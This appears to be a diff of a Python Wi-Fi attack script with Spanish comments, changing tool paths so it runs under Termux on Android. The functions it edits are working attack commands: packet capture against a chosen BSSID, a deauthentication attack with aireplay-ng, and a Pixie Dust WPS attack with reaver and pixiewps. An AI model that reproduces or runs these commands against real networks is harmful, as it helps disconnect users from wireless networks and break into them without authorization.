@@ -55,17 +55,17 @@ def scan_wifi():
 def capturar_paquetes(bssid, channel):
     """Capturar paquetes de una red específica"""
     print(f"Capturando paquetes de la red con BSSID {bssid} en el canal {channel}...")
-    run_command(f"airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0", use_sudo=True)
+    run_command(f"/data/data/com.termux/files/usr/bin/airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0", use_sudo=True)
 
 def deauth_attack(bssid):
     """Realizar un ataque de desautenticación"""
     print(f"Realizando ataque de desautenticación contra {bssid}...")
-    run_command(f"aireplay-ng --deauth 10 -a {bssid} wlan0", use_sudo=True)
+    run_command(f"/data/data/com.termux/files/usr/bin/aireplay-ng --deauth 10 -a {bssid} wlan0", use_sudo=True)
 
 def perform_pixie_dust_attack(bssid):
     """Realiza el ataque Pixie Dust usando reaver y pixiewps."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
-    reaver_path = "~/reaver-wps-fork-t6x/src/reaver"
+    reaver_path = "/data/data/com.termux/files/home/reaver-wps-fork-t6x/src/reaver"
     stdout, stderr = run_command(f"{reaver_path} -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
 
     if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
@@ -98,7 +98,7 @@ def perform_pixie_dust_attack(bssid):
 
 def main():
     # Verificar la disponibilidad de las herramientas necesarias
-    tools = ["airodump-ng", "aireplay-ng", "pixiewps"]
+    tools = ["/data/data/com.termux/files/usr/bin/airodump-ng", "/data/data/com.termux/files/usr/bin/aireplay-ng", "pixiewps"]
     for tool in tools:
         if not check_tool_availability(tool):
             return
